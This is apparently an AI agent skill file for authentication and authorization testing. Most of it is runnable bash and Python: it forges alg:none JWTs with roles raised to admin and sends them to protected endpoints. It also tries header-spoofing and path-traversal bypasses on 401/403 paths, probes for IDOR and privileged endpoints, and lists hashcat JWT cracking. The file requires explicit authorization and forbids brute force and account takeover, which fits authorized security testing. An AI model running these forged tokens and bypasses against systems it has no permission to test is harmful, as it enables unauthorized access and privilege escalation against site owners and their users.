---
name: auth-analysis
description: Systematic authentication and authorization analysis. Tests JWT weaknesses, session fixation, auth bypass on legacy/API endpoints, IDOR across object IDs, and function-level access control. Run on subdomains with identified auth surfaces (from dark-recon or url-discovery). Requires explicit authorization.
compatibility: Bash, add_hint, task context.
---

# Auth Analysis — Authentication and Authorization Testing

Covers: JWT issues, legacy endpoint bypass, session management weaknesses, IDOR, and function-level access control mismatches. Does NOT cover SAML or OAuth in depth (those are separate skills).

## Input

- `TARGET` — base URL with auth surface (e.g. `https://api.target.com`)
- `AUTH_TOKEN` — a valid session token or JWT to test with (provide if available)
- `OUTDIR` — working directory

---

## Step 1 — Map auth entry points

Gather all authentication and authorization-relevant endpoints from prior recon:

```bash
TARGET="https://api.target.com"
OUTDIR="/tmp/auth-$(echo $TARGET | md5sum | cut -c1-8)"
mkdir -p "$OUTDIR"

# Pull auth-pattern URLs from url-discovery output if available
grep -iE '(login|signin|logout|auth|oauth|sso|token|refresh|session|register|password|reset|forgot|verify|2fa|mfa|otp|admin|account|profile|me|user|users|whoami|apikey)' \
    /tmp/url-*/urls_dedup.txt 2>/dev/null \
    | grep "$TARGET" \
    > "$OUTDIR/auth_urls.txt" \
    || touch "$OUTDIR/auth_urls.txt"

echo "[+] Auth-pattern URLs: $(wc -l < "$OUTDIR/auth_urls.txt")"
```

---

## Step 2 — JWT analysis

If the application uses JWT tokens:

```bash
JWT="$AUTH_TOKEN"  # Set this to the token from login/cookie

if echo "$JWT" | grep -qE '^ey[A-Za-z0-9_-]+\.ey[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$'; then
    echo "[+] JWT detected — analyzing..."

    # Decode header and payload (no verification)
    python3 -I -c "
import base64, json, sys

token = '$JWT'
parts = token.split('.')
if len(parts) < 2:
    sys.exit(1)

def b64decode_unpadded(s):
    s += '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

try:
    header = json.loads(b64decode_unpadded(parts[0]))
    payload = json.loads(b64decode_unpadded(parts[1]))
    print('Header:', json.dumps(header, indent=2))
    print('Payload:', json.dumps(payload, indent=2))
except Exception as e:
    print('Decode error:', e)
" | tee "$OUTDIR/jwt_decoded.txt"

    # Check for weak algorithm
    ALG=$(python3 -I -c "
import base64, json
token = '$JWT'
h = token.split('.')[0] + '=='
hdr = json.loads(base64.urlsafe_b64decode(h + '==').decode())
print(hdr.get('alg','unknown'))
" 2>/dev/null)

    echo "[*] JWT algorithm: $ALG"

    # Test alg:none
    python3 -I -c "
import base64, json, sys

token = '$JWT'
parts = token.split('.')

def b64u_decode(s):
    s += '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

def b64u_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

header = json.loads(b64u_decode(parts[0]))
payload = json.loads(b64u_decode(parts[1]))

# Modify payload: try to elevate role
for field in ('role', 'is_admin', 'admin', 'isAdmin', 'scope', 'permissions', 'userType'):
    if field in payload:
        orig = payload[field]
        payload[field] = 'admin' if isinstance(orig, str) else True
        print(f'Modified {field}: {orig} -> {payload[field]}')

# alg:none token (no signature)
header['alg'] = 'none'
new_header = b64u_encode(json.dumps(header, separators=(',',':')).encode())
new_payload = b64u_encode(json.dumps(payload, separators=(',',':')).encode())

tokens_to_test = [
    f'{new_header}.{new_payload}.',
    f'{new_header}.{new_payload}',
    f'{new_header}.{new_payload}.none',
]

for t in tokens_to_test:
    print('Test token:', t[:80] + '...')
" 2>/dev/null | tee "$OUTDIR/jwt_none_payloads.txt"
fi
```

Test the alg:none tokens against protected endpoints:
```bash
while IFS= read -r test_token; do
    if echo "$test_token" | grep -q "Test token:"; then
        tok=$(echo "$test_token" | awk '{print $3}')
        resp=$(curl -sk -o /dev/null -w "%{http_code}" \
            -H "Authorization: Bearer $tok" \
            "$TARGET/api/me" --max-time 8)
        echo "alg:none response: $resp for token: ${tok:0:30}..."
    fi
done < "$OUTDIR/jwt_none_payloads.txt"
```

---

## Step 3 — Legacy endpoint bypass

Check platform-specific legacy paths that may bypass SSO/MFA:

```bash
# WordPress XMLRPC (if WordPress detected in headers/fingerprint)
curl -sk -o "$OUTDIR/xmlrpc_probe.txt" -w "\nHTTP %{http_code}\n" \
    -X POST "$TARGET/xmlrpc.php" \
    -H "Content-Type: text/xml" \
    -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' \
    --max-time 10

grep -q "methodResponse" "$OUTDIR/xmlrpc_probe.txt" && \
    echo "[!] XMLRPC enabled — legacy bypass possible"

# Spring Boot actuator
for path in /actuator /actuator/health /actuator/env /actuator/mappings /actuator/beans; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$path" --max-time 8)
    [ "$code" != "404" ] && echo "[!] Actuator exposed: $TARGET$path ($code)"
done

# Common legacy API patterns
for path in /api/v0 /api/internal /api/admin /api/debug /api/health \
            /admin /admin/api /management /console /_admin; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$path" --max-time 8)
    [ "$code" = "200" ] || [ "$code" = "401" ] || [ "$code" = "403" ] && \
        echo "[!] Found: $TARGET$path ($code)"
    sleep 1
done
```

---

## Step 4 — Auth bypass techniques (401/403 targets)

For targets that return 401/403 on the base path:

```bash
PROTECTED="$TARGET/api/admin"

echo "[*] Testing auth bypass on: $PROTECTED"

# Method override
curl -sk -o /dev/null -w "Method override: %{http_code}\n" \
    -X POST "$PROTECTED" \
    -H "X-HTTP-Method-Override: GET" \
    --max-time 8

# Header bypass
for hdr in \
    "X-Forwarded-For: 127.0.0.1" \
    "X-Real-IP: 127.0.0.1" \
    "X-Original-URL: /admin" \
    "X-Rewrite-URL: /admin" \
    "X-Custom-IP-Authorization: 127.0.0.1" \
    "Forwarded: for=127.0.0.1" \
    "Client-IP: 127.0.0.1"; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" \
        "$PROTECTED" -H "$hdr" --max-time 8)
    echo "  $hdr → $code"
    sleep 1
done

# Path traversal bypass (nginx off-by-slash)
for variant in \
    "$TARGET/api/admin../" \
    "$TARGET/api/admin%2f" \
    "$TARGET/api/admin%2F" \
    "$TARGET/%2e%2e/admin" \
    "$TARGET/api/./admin"; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" "$variant" --max-time 8)
    [ "$code" = "200" ] && echo "[!] PATH BYPASS: $variant ($code)"
    sleep 1
done
```

---

## Step 5 — IDOR scan

Test object-level authorization with sequential/guessable IDs:

```bash
# Identify endpoints with numeric or UUID parameters
grep -oP 'https?://[^/]+(/[^?]+)' "$OUTDIR/auth_urls.txt" 2>/dev/null \
    | grep -P '/[0-9a-f]{8}-[0-9a-f]{4}|/\d{1,10}($|/)' \
    | head -20 \
    > "$OUTDIR/idor_candidates.txt"

echo "[+] IDOR candidates: $(wc -l < "$OUTDIR/idor_candidates.txt")"

# For each candidate, test with victim's token vs adjacent IDs
# (requires at minimum two test accounts — skip if not available)
echo "[*] IDOR testing requires two test accounts. Endpoints identified:"
cat "$OUTDIR/idor_candidates.txt"
```

Manual IDOR test template:
```bash
# With YOUR own resource ID:
MY_RESOURCE_ID="123"
VICTIM_RESOURCE_ID="124"  # adjacent, or known from enumeration

# Access your own — should succeed
curl -sk -H "Authorization: Bearer $AUTH_TOKEN" \
    "$TARGET/api/users/$MY_RESOURCE_ID" | python3 -m json.tool

# Access victim's with your token — should fail with 403
# If it returns data instead, that's IDOR
curl -sk -H "Authorization: Bearer $AUTH_TOKEN" \
    "$TARGET/api/users/$VICTIM_RESOURCE_ID" | python3 -m json.tool
```

---

## Step 6 — Function-level access control

Test if admin/privileged endpoints reject regular-user sessions:

```bash
# List privileged endpoints found in dark-recon + url-discovery
PRIV_PATHS=(
    "/api/admin/users"
    "/api/admin/config"
    "/api/internal/stats"
    "/api/v1/admin"
    "/manage/users"
    "/api/users/all"
)

USER_TOKEN="$AUTH_TOKEN"  # Regular user token

for path in "${PRIV_PATHS[@]}"; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" \
        -H "Authorization: Bearer $USER_TOKEN" \
        "$TARGET$path" --max-time 8)
    echo "  $path → $code"
    # 200 = potential privilege escalation
    [ "$code" = "200" ] && echo "[!] PRIVILEGE ESCALATION: $TARGET$path returned 200 with user token"
    sleep 1
done
```

---

## Step 7 — Save findings

```bash
python3 -I skills/auth-analysis/scripts/summarize.py \
    "$OUTDIR" \
    "$OUTDIR/auth_findings.json"
```

For each confirmed issue:
- JWT alg:none accepted → **Critical** (authentication bypass)
- Auth header bypass → **High** (access control bypass)
- Path traversal bypass → **High**
- IDOR → **High** (unauthorized data access)
- XMLRPC enabled + bruteforceable → **Medium**
- Actuator exposed → **Medium** (info disclosure → escalate)
- Privileged endpoint with user token → **Critical** (privilege escalation)

Use `add_hint` to record PROBABLE findings; validator must confirm before CONFIRMED status.

---

## Constraints

- **Do NOT brute-force credentials** — test account logic only
- **No automated scanning tools** (sqlmap, nikto) in this skill — targeted requests only
- **Maximum 3 bypass attempts per endpoint** — stop on rate limit (429)
- **Do NOT attempt account takeover** in bug bounty without explicit program rules allowing it
- **Always use your own test account IDs** as the baseline for IDOR — never enumerate real users
- **All requests logged to `$OUTDIR`** — preserve evidence for findings

## Tools Required

| Tool | Purpose |
|------|---------|
| `curl` | HTTP requests |
| Python 3 | JWT decode, payload construction |
| `hashcat` | JWT secret brute-force (mode 16500) — separate step, needs approval |
